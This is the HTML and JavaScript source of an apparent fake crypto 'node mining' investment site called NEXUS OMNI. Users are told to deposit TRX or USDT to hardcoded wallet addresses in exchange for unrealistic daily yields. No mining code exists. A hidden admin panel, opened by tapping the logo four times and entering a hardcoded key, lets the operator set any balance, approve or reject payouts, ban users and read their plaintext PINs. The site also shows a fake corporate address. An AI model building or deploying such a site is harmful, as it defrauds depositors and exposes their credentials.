<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NEXUS OMNI | Professional Node Terminal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap');
        :root { --nexus-blue: #2563eb; --nexus-dark: #0f172a; }
        body { background: #f1f5f9; color: #1e293b; font-family: 'Plus Jakarta Sans', sans-serif; -webkit-tap-highlight-color: transparent; }
        
        /* Fixed Input Visibility */
        .input-prime { 
            background: #ffffff !important; 
            color: #0f172a !important; 
            border: 2px solid #e2e8f0 !important;
            border-radius: 20px; 
            padding: 18px; 
            width: 100%; 
            outline: none; 
            font-weight: 700; 
            font-size: 15px;
            box-shadow: inset 0 2px 4px rgba(0,0,0,0.02);
        }
        .input-prime::placeholder { color: #94a3b8 !important; font-weight: 500; }
        .input-prime:focus { border-color: var(--nexus-blue) !important; }

        /* Dashboard & Cards */
        .glass-card { background: #ffffff; border-radius: 35px; box-shadow: 0 20px 40px -10px rgba(0,0,0,0.05); }
        .node-card { background: #fff; border-radius: 30px; overflow: hidden; display: flex; height: 130px; box-shadow: 0 10px 25px -5px rgba(0,0,0,0.03); margin-bottom: 15px; border: 1px solid #f1f5f9; }
        .node-img { width: 120px; height: 130px; object-fit: cover; }
        
        .btn-prime { background: var(--nexus-dark); color: #fff; border-radius: 22px; font-weight: 800; padding: 18px; width: 100%; text-transform: uppercase; font-size: 11px; letter-spacing: 2px; }
        .nav-link { color: #94a3b8; font-size: 10px; font-weight: 800; text-align: center; flex: 1; }
        .nav-link.active { color: var(--nexus-blue); }

        #preloader { position: fixed; inset: 0; background: #fff; z-index: 50000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .legal-modal { display: none; position: fixed; inset: 0; background: white; z-index: 20000; overflow-y: auto; padding: 30px; }
    </style>
</head>
<body>

    <div id="preloader">
        <div class="w-12 h-12 border-4 border-slate-200 border-t-blue-600 rounded-full animate-spin"></div>
    </div>

    <div id="auth-view" class="min-h-screen flex items-center justify-center p-8 bg-slate-50">
        <div class="max-w-md w-full space-y-10">
            <div class="text-center">
                <h1 class="text-5xl font-black italic tracking-tighter text-slate-900">NEXUS<span class="text-blue-600">.</span></h1>
                <p class="text-[9px] font-black text-slate-400 uppercase tracking-[8px] mt-2">Institutional Terminal</p>
            </div>
            
            <div id="login-box" class="glass-card p-10 space-y-6">
                <div>
                    <label class="text-[10px] font-black uppercase ml-2 text-slate-400">Account ID</label>
                    <input type="text" id="l-user" placeholder="Enter your ID" class="input-prime mt-1">
                </div>
                <div>
                    <label class="text-[10px] font-black uppercase ml-2 text-slate-400">Security PIN</label>
                    <input type="password" id="l-pass" placeholder="••••" class="input-prime mt-1">
                </div>
                <button onclick="login()" class="btn-prime mt-4 shadow-xl shadow-slate-200">Verify Identity</button>
                <p class="text-center text-[10px] font-black text-slate-500 uppercase">New? <span onclick="toggleAuth(true)" class="text-blue-600 cursor-pointer">Create Account</span></p>
            </div>

            <div id="signup-box" class="glass-card p-10 space-y-6 hidden">
                <input type="text" id="s-user" placeholder="Create Account ID" class="input-prime">
                <input type="password" id="s-pass" placeholder="Create Security PIN" class="input-prime">
                <button onclick="signup()" class="btn-prime shadow-xl shadow-slate-200">Initialize Vault</button>
                <p class="text-center text-[10px] font-black text-slate-500 uppercase">Existing? <span onclick="toggleAuth(false)" class="text-blue-600 cursor-pointer">Login</span></p>
            </div>
        </div>
    </div>

    <div id="main-view" class="hidden pb-44">
        <header class="p-6 sticky top-0 z-50 bg-white/90 backdrop-blur-2xl border-b border-slate-100 flex justify-between items-center">
            <div class="flex items-center gap-4">
                <div id="logo-trigger" class="w-12 h-12 bg-slate-900 text-white rounded-2xl flex items-center justify-center text-xl font-black">N</div>
                <div>
                    <p id="display-name" class="text-sm font-black text-slate-900 uppercase">---</p>
                    <p class="text-[8px] font-bold text-emerald-500 uppercase tracking-widest">● System Live</p>
                </div>
            </div>
            <button onclick="logout()" class="w-10 h-10 rounded-xl bg-slate-100 text-slate-400 flex items-center justify-center"><i class="fa-solid fa-power-off"></i></button>
        </header>

        <main id="tab-home" class="p-6 space-y-6">
            <div class="glass-card p-10 bg-white border border-slate-50">
                <p class="text-[10px] font-bold text-slate-400 uppercase tracking-[3px]">Capital Balance</p>
                <h2 id="ui-bal" class="text-5xl font-black mt-2 text-slate-900 tracking-tighter">$0.00</h2>
                
                <div class="mt-10 pt-8 border-t border-slate-50 flex justify-between items-center">
                    <div>
                        <p class="text-[9px] font-bold text-slate-400 uppercase">Mining Yield</p>
                        <p id="ui-prof" class="text-2xl font-black text-emerald-600">+$0.00</p>
                    </div>
                    <button onclick="nav('bank')" class="bg-blue-600 text-white px-6 py-3 rounded-2xl text-[10px] font-black uppercase tracking-widest shadow-lg shadow-blue-100">Capital</button>
                </div>
            </div>

            <div class="grid grid-cols-2 gap-3">
                <button onclick="showLegal('about')" class="bg-white p-4 rounded-2xl text-[9px] font-black uppercase text-slate-500 border border-slate-50 shadow-sm">Corporate Info</button>
                <button onclick="showLegal('faq')" class="bg-white p-4 rounded-2xl text-[9px] font-black uppercase text-slate-500 border border-slate-50 shadow-sm">Help Center</button>
            </div>

            <h3 class="text-[10px] font-black text-slate-400 uppercase tracking-[5px] ml-1">Live Protocols</h3>
            <div id="active-list" class="space-y-4"></div>
        </main>

        <main id="tab-nodes" class="p-6 hidden"><div id="elite-box" class="space-y-4 mb-8"></div><div id="retail-box" class="space-y-4"></div></main>
        
        <main id="tab-bank" class="p-6 space-y-6 hidden">
            <div class="glass-card p-8 space-y-6">
                <h3 class="text-xs font-black uppercase text-blue-600">Add Liquidity</h3>
                <select id="d-asset" class="input-prime" onchange="updAddr()">
                    <option value="">Choose Asset</option>
                    <option value="TRX">TRX (Tron)</option>
                    <option value="USDT">USDT (TRC20)</option>
                </select>
                <div id="d-panel" class="hidden space-y-4">
                    <p id="addr-txt" class="text-[10px] font-mono font-black text-blue-600 p-4 bg-slate-50 rounded-xl break-all text-center"></p>
                    <input type="number" id="d-amt" placeholder="Amount ($)" class="input-prime">
                    <input type="text" id="d-tid" placeholder="Transaction Hash" class="input-prime">
                    <input type="file" id="d-img" class="text-[10px]">
                    <button onclick="sendD()" class="btn-prime">Submit Audit</button>
                </div>
            </div>

            <div class="glass-card p-8 space-y-6 border-t-4 border-slate-900">
                <h3 class="text-xs font-black uppercase text-slate-400">Withdrawal</h3>
                <select id="w-method" class="input-prime">
                    <option value="">Choose Gateway</option>
                    <option value="Binance">Binance</option>
                    <option value="OKX">OKX</option>
                    <option value="TrustWallet">Trust Wallet</option>
                    <option value="Bank">Global Bank Transfer</option>
                </select>
                <input type="number" id="w-amt" placeholder="Amount ($)" class="input-prime">
                <input type="text" id="w-acc" placeholder="Wallet Address / IBAN" class="input-prime">
                <button onclick="sendW()" class="btn-prime !bg-blue-600">Request Payout</button>
            </div>
        </main>

        <main id="tab-ledger" class="p-6 hidden"><div id="ledger-box" class="space-y-4"></div></main>

        <nav class="fixed bottom-8 left-6 right-6 h-20 glass-card flex justify-around items-center px-2 z-[1000] border border-slate-100">
            <div onclick="nav('home')" class="nav-link active"><i class="fa-solid fa-home-alt text-xl mb-1"></i><br>HOME</div>
            <div onclick="nav('nodes')" class="nav-link"><i class="fa-solid fa-server text-xl mb-1"></i><br>NODES</div>
            <div onclick="nav('bank')" class="nav-link"><i class="fa-solid fa-wallet text-xl mb-1"></i><br>BANK</div>
            <div onclick="nav('ledger')" class="nav-link"><i class="fa-solid fa-history text-xl mb-1"></i><br>LEDGER</div>
        </nav>
    </div>

    <div id="adm-panel" class="fixed inset-0 bg-white z-[10001] p-8 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-10 border-b pb-6">
            <h2 class="text-xl font-black uppercase text-blue-600">Sovereign Admin</h2>
            <button onclick="document.getElementById('adm-panel').classList.add('hidden')" class="text-4xl">&times;</button>
        </div>
        <div id="adm-users" class="space-y-4 mb-10"></div>
        <div id="adm-requests" class="space-y-4"></div>
    </div>

    <div id="legal-modal" class="legal-modal">
        <button onclick="closeLegal()" class="text-4xl float-right">&times;</button>
        <h2 id="legal-h" class="text-2xl font-black uppercase mt-12 mb-6"></h2>
        <div id="legal-body" class="text-sm text-slate-500 space-y-4 leading-relaxed"></div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, onValue, push, update, remove } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const config = { apiKey: "AIzaSyDaOGSlBjS7_pQX9ELAytXVF4jvWK_lzB0", authDomain: "live-54fb4.firebaseapp.com", databaseURL: "https://live-54fb4-default-rtdb.firebaseio.com", projectId: "live-54fb4", storageBucket: "live-54fb4.firebasestorage.app", messagingSenderId: "781910562842", appId: "1:781910562842:web:07a887f860d30fd17d99a3" };
        const app = initializeApp(config);
        const db = getDatabase(app);

        const nodeData = {
            elite: [{ id: 'e1', name: "Omni Sovereign", price: 5000, daily: 800, img: "https://images.unsplash.com/photo-1639762681485-074b7f938ba0?w=400" }],
            retail: Array.from({length: 6}, (_, i) => ({ id: `r${i}`, name: `Nexus Node v${i+1}`, price: 100 + (i*300), daily: 10 + (i*25), img: `https://images.unsplash.com/photo-1614850523296-d8c1af93d400?w=400&sig=${i}` }))
        };

        window.onload = () => {
            renderNodes();
            setTimeout(() => document.getElementById('preloader').style.display='none', 800);
            const user = localStorage.getItem('nx_usr');
            if(user) startSession(user);
        };

        window.login = async () => {
            const u = document.getElementById('l-user').value.trim(), p = document.getElementById('l-pass').value;
            const s = await get(ref(db, `users/${u}`));
            if(s.exists() && s.val().password === p) { localStorage.setItem('nx_usr', u); startSession(u); } else alert("Invalid Credentials");
        };

        window.signup = async () => {
            const u = document.getElementById('s-user').value.trim(), p = document.getElementById('s-pass').value;
            if(u && p) { await set(ref(db, `users/${u}`), { username: u, password: p, balance: 0, profit: 0, banned: false }); toggleAuth(false); }
        };

        function startSession(uid) {
            document.getElementById('auth-view').classList.add('hidden');
            document.getElementById('main-view').classList.remove('hidden');
            document.getElementById('display-name').innerText = uid;
            onValue(ref(db, `users/${uid}`), (snap) => {
                const d = snap.val(); if(!d) return;
                if(d.banned) { logout(); return; }
                document.getElementById('ui-bal').innerText = '$' + (d.balance || 0).toLocaleString();
                document.getElementById('ui-prof').innerText = '+$' + (d.profit || 0).toLocaleString();
                const active = d.nodes ? Object.entries(d.nodes) : [];
                document.getElementById('active-list').innerHTML = active.map(([k, v]) => `
                    <div class="glass-card p-6 flex justify-between items-center border-l-8 border-blue-600">
                        <div><p class="text-[11px] font-black uppercase text-slate-800">${v.name}</p><p class="text-[8px] font-bold text-slate-400 mt-1 uppercase">Hardware Mining Active</p></div>
                        <span class="text-[9px] font-black bg-blue-50 text-blue-600 px-4 py-2 rounded-xl">ONLINE</span>
                    </div>`).join('') || '<p class="text-center py-10 text-slate-300 font-black uppercase text-[9px]">No Active Protocols</p>';
                const hist = d.history ? Object.entries(d.history).reverse() : [];
                document.getElementById('ledger-box').innerHTML = hist.map(([k, h]) => `
                    <div class="bg-white p-5 rounded-2xl flex justify-between items-center shadow-sm">
                        <div><p class="text-[10px] font-black uppercase text-slate-900">${h.type}</p><p class="text-[8px] font-bold text-slate-400">${h.date}</p></div>
                        <div class="text-right"><p class="text-xs font-black text-slate-900">$${h.amount}</p><p class="text-[8px] font-black uppercase ${h.status === 'Cleared' ? 'text-emerald-500' : 'text-amber-500'}">${h.status}</p></div>
                    </div>`).join('');
            });
        }

        // Admin Taps
        let taps = 0; document.getElementById('logo-trigger').onclick = () => {
            taps++; if(taps === 4) { if(prompt("Key:") === "coin786") { document.getElementById('adm-panel').classList.remove('hidden'); runAdm(); } taps = 0; }
        };

        function runAdm() {
            onValue(ref(db, 'users'), (s) => {
                const u = s.val();
                document.getElementById('adm-users').innerHTML = u ? Object.entries(u).map(([id, d]) => `
                    <div class="bg-slate-50 p-5 rounded-2xl space-y-3">
                        <p class="font-black text-xs uppercase text-slate-900">${id} (PIN: ${d.password})</p>
                        <div class="flex gap-2">
                            <button onclick="modBal('${id}','add')" class="bg-emerald-600 text-white text-[8px] font-black px-3 py-2 rounded-lg">ADD $</button>
                            <button onclick="modBal('${id}','rem')" class="bg-rose-600 text-white text-[8px] font-black px-3 py-2 rounded-lg">SUB $</button>
                            <button onclick="toggleBan('${id}', ${d.banned})" class="bg-black text-white text-[8px] font-black px-3 py-2 rounded-lg">${d.banned ? 'UNBAN' : 'BAN'}</button>
                        </div>
                    </div>`).join('') : '';
            });
            onValue(ref(db, 'admin/requests'), (s) => {
                const d = s.val();
                document.getElementById('adm-requests').innerHTML = d ? Object.values(d).map(r => `
                    <div class="glass-card p-5 border space-y-3">
                        <p class="text-[10px] font-black uppercase">${r.type} | ${r.user} | $${r.amount}</p>
                        <p class="text-[9px] text-slate-400">Target: ${r.accDetails || 'N/A'}</p>
                        ${r.proof ? `<img src="${r.proof}" class="w-full h-32 object-cover rounded-xl">` : ''}
                        <div class="flex gap-2">
                            <button onclick="audit('${r.id}','${r.user}',${r.amount},'Cleared','${r.type}')" class="bg-emerald-600 text-white py-3 rounded-xl flex-1 font-black text-[9px]">APPROVE</button>
                            <button onclick="audit('${r.id}','${r.user}',${r.amount},'Declined','${r.type}')" class="bg-rose-600 text-white py-3 rounded-xl flex-1 font-black text-[9px]">REJECT</button>
                        </div>
                    </div>`).join('') : '';
            });
        }

        window.modBal = async (uid, type) => {
            const val = prompt("Amount:"); if(!val) return;
            const s = await get(ref(db, `users/${uid}`));
            const cur = s.val().balance || 0;
            await update(ref(db, `users/${uid}`), { balance: type === 'add' ? cur + parseFloat(val) : cur - parseFloat(val) });
        };
        window.toggleBan = async (uid, cur) => await update(ref(db, `users/${uid}`), { banned: !cur });
        window.audit = async (id, user, amt, status, type) => {
            if(status === 'Cleared' && type === 'Deposit') {
                const s = await get(ref(db, `users/${user}`));
                await update(ref(db, `users/${user}`), { balance: (s.val().balance || 0) + parseFloat(amt) });
            }
            if(status === 'Declined' && type === 'Withdrawal') {
                const s = await get(ref(db, `users/${user}`));
                await update(ref(db, `users/${user}`), { balance: (s.val().balance || 0) + parseFloat(amt) });
            }
            await update(ref(db, `users/${user}/history/${id}`), { status });
            await remove(ref(db, 'admin/requests/' + id));
        };

        function renderNodes() {
            const ui = (n) => `<div class="node-card"><img src="${n.img}" class="node-img"><div class="node-info"><h4 class="text-[11px] font-black uppercase text-slate-800">${n.name}</h4><p class="text-[10px] font-bold text-emerald-600 mt-1">Daily: $${n.daily}</p><div class="flex justify-between items-center mt-3"><span class="text-lg font-black text-slate-900">$${n.price}</span><button onclick="buyNode('${n.id}', ${n.price}, '${n.name}')" class="bg-blue-600 text-white text-[9px] font-black px-4 py-2 rounded-xl">DEPLOY</button></div></div></div>`;
            document.getElementById('elite-box').innerHTML = nodeData.elite.map(ui).join('');
            document.getElementById('retail-box').innerHTML = nodeData.retail.map(ui).join('');
        }

        window.buyNode = async (id, price, name) => {
            const uid = localStorage.getItem('nx_usr'), s = await get(ref(db, `users/${uid}`));
            if(s.val().balance < price) return alert("Insufficient Balance");
            await update(ref(db, `users/${uid}`), { balance: s.val().balance - price });
            await push(ref(db, `users/${uid}/nodes`), { name, deployedAt: Date.now() });
            alert("Protocol Deployed!"); nav('home');
        };

        const legals = {
            about: "702 Main Street, Woodland, California, USA.<br><br>Nexus Omni is a global leader in high-performance node infrastructure and decentralized yield farming.",
            faq: "<b>Withdrawals:</b> Processed within 1-6 hours.<br><b>Minimum:</b> $10 for all assets."
        };
        window.showLegal = (t) => { document.getElementById('legal-h').innerText = t.toUpperCase(); document.getElementById('legal-body').innerHTML = legals[t]; document.getElementById('legal-modal').style.display = 'block'; };
        window.closeLegal = () => document.getElementById('legal-modal').style.display = 'none';
        window.nav = (p) => { ['home','nodes','bank','ledger'].forEach(x => document.getElementById('tab-'+x).classList.add('hidden')); document.getElementById('tab-'+p).classList.remove('hidden'); document.querySelectorAll('.nav-link').forEach(i => i.classList.remove('active')); event.currentTarget.classList.add('active'); };
        window.updAddr = () => { const m = document.getElementById('d-asset').value, map = { "TRX": "TK1ZYaXdfabtqpEeYfRjcACeXnCrGoVx76", "USDT": "TAvfQQ18hXHdVCHbExV4yUPvQ4XkNgfKsJ" }; document.getElementById('addr-txt').innerText = map[m] || ""; document.getElementById('d-panel').classList.toggle('hidden', !m); };
        window.sendD = () => { const f = document.getElementById('d-img').files[0]; if(!f) return; const reader = new FileReader(); reader.readAsDataURL(f); reader.onload = async () => { const uid = localStorage.getItem('nx_usr'), key = push(ref(db, 'admin/requests')).key; const req = { id: key, user: uid, amount: document.getElementById('d-amt').value, proof: reader.result, status: 'Pending', type: 'Deposit', date: new Date().toLocaleString() }; await set(ref(db, `admin/requests/${key}`), req); await set(ref(db, `users/${uid}/history/${key}`), req); alert("Audit Started"); nav('ledger'); }; };
        window.sendW = async () => { const uid = localStorage.getItem('nx_usr'), amt = parseFloat(document.getElementById('w-amt').value), method = document.getElementById('w-method').value, acc = document.getElementById('w-acc').value; if(!amt || !method) return; const s = await get(ref(db, `users/${uid}`)); if(s.val().balance < amt) return alert("Insufficient Balance"); await update(ref(db, `users/${uid}`), { balance: s.val().balance - amt }); const key = push(ref(db, 'admin/requests')).key; const req = { id: key, user: uid, amount: amt, method, accDetails: acc, status: 'Pending', type: 'Withdrawal', date: new Date().toLocaleString() }; await set(ref(db, `admin/requests/${key}`), req); await set(ref(db, `users/${uid}/history/${key}`), req); alert("Withdrawal Sent"); nav('ledger'); };
        window.toggleAuth = (s) => { document.getElementById('login-box').classList.toggle('hidden', s); document.getElementById('signup-box').classList.toggle('hidden', !s); };
        window.logout = () => { localStorage.clear(); location.reload(); };
    </script>
</body>
</html>
